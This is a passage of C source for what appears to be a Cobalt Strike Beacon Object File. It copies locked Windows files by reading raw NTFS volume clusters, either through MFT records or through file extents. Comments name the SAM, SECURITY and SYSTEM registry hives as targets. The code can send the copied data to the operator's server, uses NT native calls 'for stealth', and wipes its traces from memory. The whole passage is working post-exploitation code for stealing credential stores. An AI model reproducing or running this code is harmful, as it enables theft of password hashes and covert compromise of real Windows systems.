            if ((fullDestPath[0] == L'\\' && fullDestPath[1] == L'\\' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\') ||
                (fullDestPath[0] == L'\\' && fullDestPath[1] == L'?' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\')) {
                // Already normalized, but convert \\?\ to \??\ if needed
                if (fullDestPath[1] == L'\\') {
                    normalizedDestPath[0] = L'\\';
                    normalizedDestPath[1] = L'?';
                    normalizedDestPath[2] = L'?';
                    normalizedDestPath[3] = L'\\';
                    MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath + 4, (destPathLen - 3) * sizeof(WCHAR));
                } else {
                    MSVCRT$memcpy(normalizedDestPath, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
                }
            } else {
                // Add \??\ prefix
                normalizedDestPath[0] = L'\\';
                normalizedDestPath[1] = L'?';
                normalizedDestPath[2] = L'?';
                normalizedDestPath[3] = L'\\';
                MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
                destPathLen += 4;
            }
            
            OBJECT_ATTRIBUTES objAttr;
            UNICODE_STRING outputPath;
            IO_STATUS_BLOCK ioStatus;
            
            // Use RtlInitUnicodeString for proper initialization
            NTDLL$RtlInitUnicodeString(&outputPath, normalizedDestPath);
            
            objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
            objAttr.RootDirectory = NULL;
            objAttr.ObjectName = &outputPath;
            objAttr.Attributes = OBJ_CASE_INSENSITIVE;
            objAttr.SecurityDescriptor = NULL;
            objAttr.SecurityQualityOfService = NULL;
            
            status = NTDLL$NtCreateFile(
                &hOutput,
                FILE_WRITE_DATA | SYNCHRONIZE,
                &objAttr,
                &ioStatus,
                NULL,
                FILE_ATTRIBUTE_NORMAL,
                0,
                FILE_OVERWRITE_IF,
                FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
                NULL,
                0
            );

            if (!NT_SUCCESS(status)) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create output file: 0x%08X\n", status);
                goto cleanup;
            }
            
            if (!CopyFileByMft(hVolume, hOutput, &fileInfo, &boot)) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy file data\n");
                goto cleanup;
            }

            success = TRUE;
            BeaconPrintf(CALLBACK_OUTPUT, "[+] File copied successfully: %llu bytes\n", fileSize);
        }
    } else if (MSVCRT$strcmp(mode, "Metadata") == 0) {
        // Metadata mode - use FSCTL_GET_RETRIEVAL_POINTERS
        HANDLE hSourceFile = INVALID_HANDLE_VALUE;
        EXTENT* extents = NULL;
        DWORD extentCount = 0;
        
        // Get file size
        if (!GetNtfsFileInfo(sourceFileW, &mftRecordNumber, &fileSize)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get file info from source\n");
            goto cleanup;
        }
        
        // Open source file for getting extents using CreateFileW (DeviceIoControl requires CreateFileW handle)
        WCHAR normalizedSourcePath[MAX_PATH * 2];
        int sourcePathLen = KERNEL32$lstrlenW(sourceFileW);
        
        // Normalize path with \\?\ prefix for CreateFileW (same as GetNtfsFileInfo)
        if (sourceFileW[0] != L'\\' || sourceFileW[1] != L'\\' || sourceFileW[2] != L'?' || sourceFileW[3] != L'\\') {
            normalizedSourcePath[0] = L'\\';
            normalizedSourcePath[1] = L'\\';
            normalizedSourcePath[2] = L'?';
            normalizedSourcePath[3] = L'\\';
            MSVCRT$memcpy(normalizedSourcePath + 4, sourceFileW, (sourcePathLen + 1) * sizeof(WCHAR));
        } else {
            MSVCRT$memcpy(normalizedSourcePath, sourceFileW, (sourcePathLen + 1) * sizeof(WCHAR));
        }
        
        // Try with minimal access rights first (FSCTL_GET_RETRIEVAL_POINTERS may work with just FILE_READ_ATTRIBUTES)
        // For locked files like SAM, SECURITY, SYSTEM, we need FILE_FLAG_BACKUP_SEMANTICS
        hSourceFile = KERNEL32$CreateFileW(
            normalizedSourcePath,
            FILE_READ_ATTRIBUTES,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL,
            OPEN_EXISTING,
            FILE_FLAG_BACKUP_SEMANTICS,
            NULL
        );
        
        // If that fails, try with FILE_READ_DATA (but this usually fails for locked files)
        if (hSourceFile == INVALID_HANDLE_VALUE) {
            DWORD error1 = KERNEL32$GetLastError();
            hSourceFile = KERNEL32$CreateFileW(
                normalizedSourcePath,
                FILE_READ_ATTRIBUTES | FILE_READ_DATA,
                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                NULL,
                OPEN_EXISTING,
                FILE_FLAG_BACKUP_SEMANTICS,
                NULL
            );
            if (hSourceFile == INVALID_HANDLE_VALUE) {
                // Both attempts failed - file is likely locked
                DWORD error2 = KERNEL32$GetLastError();
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open source file (locked?): first=0x%08X, second=0x%08X\n", error1, error2);
                BeaconPrintf(CALLBACK_ERROR, "[-] Note: For locked files (SAM, SECURITY, SYSTEM), use MFT mode instead\n");
                goto cleanup;
            }
        }
        
        if (hSourceFile == INVALID_HANDLE_VALUE) {
            DWORD error = KERNEL32$GetLastError();
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open source file: 0x%08X\n", error);
            goto cleanup;
        }
        
        // Get extents
        if (GetFileExtents(hSourceFile, &extents, &extentCount) == 0) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to get file extents\n");
            KERNEL32$CloseHandle(hSourceFile);
            goto cleanup;
        }
        
        KERNEL32$CloseHandle(hSourceFile);
        
        if (downloadToServer) {
            // Copy file directly to memory for download
            ULONGLONG copiedSize = 0;
            BYTE* tempBuffer = NULL;
            ULONGLONG tempSize = 0;
            
            // Create temporary output file handle (we'll read from it)
            // Actually, we need to copy directly from volume to memory
            // For simplicity, create a temp file and read it back
            // Better approach: copy directly from volume to memory buffer
            
            // Allocate buffer for file data
            tempBuffer = (BYTE*)intAlloc((SIZE_T)fileSize);
            if (!tempBuffer) {
                intFree(extents);
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate memory buffer\n");
                goto cleanup;
            }
            
            // Copy file data from volume to memory using extents
            ULONGLONG bytesCopied = 0;
            BYTE* readBuffer = (BYTE*)intAlloc(64 * 1024);
            if (!readBuffer) {
                intFree(tempBuffer);
                intFree(extents);
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to allocate read buffer\n");
                goto cleanup;
            }
            
            for (DWORD i = 0; i < extentCount; i++) {
                ULONGLONG extentBytes = extents[i].lengthClusters * boot.clusterSize;
                ULONGLONG remaining = fileSize - bytesCopied;
                ULONGLONG toCopy = (extentBytes > remaining) ? remaining : extentBytes;
                
                if (toCopy == 0) break;
                
                // Check for sparse extent (LCN = -1 indicates sparse cluster in FSCTL_GET_RETRIEVAL_POINTERS)
                if (extents[i].lcn == (ULONGLONG)-1) {
                    // Sparse extent - write zeros
                    MSVCRT$memset(tempBuffer + bytesCopied, 0, (size_t)toCopy);
                    bytesCopied += toCopy;
                    continue;
                }
                
                ULONGLONG diskOffset = extents[i].lcn * boot.clusterSize;
                ULONGLONG copied = 0;
                
                while (copied < toCopy) {
                    ULONG chunkSize = (ULONG)((toCopy - copied > 64 * 1024) ? 64 * 1024 : (toCopy - copied));
                    
                    LARGE_INTEGER readOffset;
                    readOffset.QuadPart = diskOffset + copied;
                    IO_STATUS_BLOCK ioStatus;
                    NTSTATUS status = NTDLL$NtReadFile(
                        hVolume,
                        NULL,
                        NULL,
                        NULL,
                        &ioStatus,
                        readBuffer,
                        chunkSize,
                        &readOffset,
                        NULL
                    );
                    
                    if (!NT_SUCCESS(status)) {
                        // If we've copied some data and reached file size, it's OK
                        if (bytesCopied >= fileSize) {
                            break;
                        }
                        intFree(readBuffer);
                        intFree(tempBuffer);
                        intFree(extents);
                        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read file data from volume\n");
                        goto cleanup;
                    }
                    
                    // If read returned 0 bytes, check if we've reached the end
                    if (ioStatus.Information == 0) {
                        // If we've copied enough data, it's OK
                        if (bytesCopied >= fileSize) {
                            break;
                        }
                        // Otherwise, it's an error
                        intFree(readBuffer);
                        intFree(tempBuffer);
                        intFree(extents);
                        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read file data from volume (unexpected EOF)\n");
                        goto cleanup;
                    }
                    
                    // Copy to tempBuffer at correct offset: bytesCopied + copied
                    MSVCRT$memcpy(tempBuffer + bytesCopied + copied, readBuffer, (size_t)ioStatus.Information);
                    copied += ioStatus.Information;
                }
                
                bytesCopied += copied;
                if (bytesCopied >= fileSize) break;
            }
            
            intFree(readBuffer);
            
            // Verify that we copied the complete file
            if (bytesCopied != fileSize) {
                intFree(tempBuffer);
                intFree(extents);
                BeaconPrintf(CALLBACK_ERROR, "[-] File copy incomplete: %llu of %llu bytes\n", bytesCopied, fileSize);
                goto cleanup;
            }
            
            copiedSize = bytesCopied;
            
            // Download to server
            if (download_file(sourceFile, destFile, (char*)tempBuffer, (ULONG32)copiedSize)) {
                success = TRUE;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] File copied and downloaded to server: %llu bytes\n", copiedSize);
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to download file to server\n");
            }
            
            intFree(tempBuffer);
        } else {
            // Create output file using NtCreateFile for stealth
            WCHAR fullDestPath[MAX_PATH * 2];
            WCHAR* filePart = NULL;
            DWORD fullPathLen = KERNEL32$GetFullPathNameW(destFileW, MAX_PATH * 2, fullDestPath, &filePart);
            
            if (fullPathLen == 0 || fullPathLen >= MAX_PATH * 2) {
                fullPathLen = KERNEL32$lstrlenW(destFileW);
                MSVCRT$memcpy(fullDestPath, destFileW, (fullPathLen + 1) * sizeof(WCHAR));
            }
            
            // Normalize path with \??\ prefix
            WCHAR normalizedDestPath[MAX_PATH * 2];
            int destPathLen = fullPathLen;
            
            if ((fullDestPath[0] == L'\\' && fullDestPath[1] == L'\\' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\') ||
                (fullDestPath[0] == L'\\' && fullDestPath[1] == L'?' && fullDestPath[2] == L'?' && fullDestPath[3] == L'\\')) {
                if (fullDestPath[1] == L'\\') {
                    normalizedDestPath[0] = L'\\';
                    normalizedDestPath[1] = L'?';
                    normalizedDestPath[2] = L'?';
                    normalizedDestPath[3] = L'\\';
                    MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath + 4, (destPathLen - 3) * sizeof(WCHAR));
                } else {
                    MSVCRT$memcpy(normalizedDestPath, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
                }
            } else {
                normalizedDestPath[0] = L'\\';
                normalizedDestPath[1] = L'?';
                normalizedDestPath[2] = L'?';
                normalizedDestPath[3] = L'\\';
                MSVCRT$memcpy(normalizedDestPath + 4, fullDestPath, (destPathLen + 1) * sizeof(WCHAR));
                destPathLen += 4;
            }
            
            OBJECT_ATTRIBUTES objAttr;
            UNICODE_STRING outputPath;
            IO_STATUS_BLOCK ioStatus;
            NTSTATUS status;
            
            NTDLL$RtlInitUnicodeString(&outputPath, normalizedDestPath);
            
            objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
            objAttr.RootDirectory = NULL;
            objAttr.ObjectName = &outputPath;
            objAttr.Attributes = OBJ_CASE_INSENSITIVE;
            objAttr.SecurityDescriptor = NULL;
            objAttr.SecurityQualityOfService = NULL;
            
            status = NTDLL$NtCreateFile(
                &hOutput,
                FILE_WRITE_DATA | SYNCHRONIZE,
                &objAttr,
                &ioStatus,
                NULL,
                FILE_ATTRIBUTE_NORMAL,
                0,
                FILE_OVERWRITE_IF,
                FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE,
                NULL,
                0
            );
            
            if (!NT_SUCCESS(status)) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create output file: 0x%08X\n", status);
                intFree(extents);
                goto cleanup;
            }
            
            if (!CopyFileByExtents(hVolume, hOutput, extents, extentCount, boot.clusterSize, fileSize)) {
                BeaconPrintf(CALLBACK_ERROR, "[-] Failed to copy file data\n");
                intFree(extents);
                goto cleanup;
            }
            
            success = TRUE;
            BeaconPrintf(CALLBACK_OUTPUT, "[+] File copied successfully: %llu bytes\n", fileSize);
        }
        
        if (extents) {
            intFree(extents);
        }
    }

cleanup:
    // Clean up handles using NtClose for stealth
    if (hVolume != INVALID_HANDLE_VALUE) {
        NTDLL$NtClose(hVolume);
    }
    if (hOutput != INVALID_HANDLE_VALUE) {
        NTDLL$NtClose(hOutput);
    }
    
    // Securely clear and free memory
    if (mftRecord) {
        MSVCRT$memset(mftRecord, 0, MFT_RECORD_SIZE);
        intFree(mftRecord);
    }
    if (fileInfo.runs) {
        MSVCRT$memset(fileInfo.runs, 0, sizeof(DATA_RUN) * fileInfo.runCount);
        intFree(fileInfo.runs);
    }
    if (fileInfo.residentData) {
        MSVCRT$memset(fileInfo.residentData, 0, fileInfo.residentDataSize);
        intFree(fileInfo.residentData);
    }
    if (sourceFileW) {
        MSVCRT$memset(sourceFileW, 0, sourceLen * sizeof(WCHAR));
        intFree(sourceFileW);
    }
    if (destFileW) {
        int destLen = KERNEL32$lstrlenW(destFileW) + 1;
        MSVCRT$memset(destFileW, 0, destLen * sizeof(WCHAR));
        intFree(destFileW);
    }
    
    if (fileBuffer) {
        MSVCRT$memset(fileBuffer, 0, (SIZE_T)fileSize);
        intFree(fileBuffer);
    }
    
    // Clear sensitive data from stack
    MSVCRT$memset(&boot, 0, sizeof(boot));
    MSVCRT$memset(&fileInfo, 0, sizeof(fileInfo));
}

